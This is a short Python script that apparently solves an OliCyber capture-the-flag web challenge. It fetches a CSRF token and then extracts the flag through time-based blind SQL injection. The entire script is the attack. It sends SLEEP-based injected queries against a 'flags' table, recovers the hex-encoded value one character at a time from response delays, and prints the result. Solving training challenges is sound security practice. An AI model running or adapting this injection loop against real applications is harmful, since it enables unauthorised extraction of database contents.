import requests
import time

url = "http://web-17.challs.olicyber.it/api/time"

client = requests.session()

resp = client.get("http://web-17.challs.olicyber.it/api/get_token")
resp = resp.json()
token = resp["token"]
headers = {"X-Csrftoken" : token}

guess = ''
dictionary = '0123456789abcdef'

while True:
    for c in dictionary:
        query = "1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '"+ guess + c +"%') -- "
        payload = {'query' : query, }
        start = time.time()
        response = client.post(url, json=payload, headers=headers, verify=False)
        end = time.time()

        response = response.json()
        if end - start >= 1:
            guess += c
            if len(guess) % 2 == 0:
                print(bytes.fromhex(guess))
            break
    else: break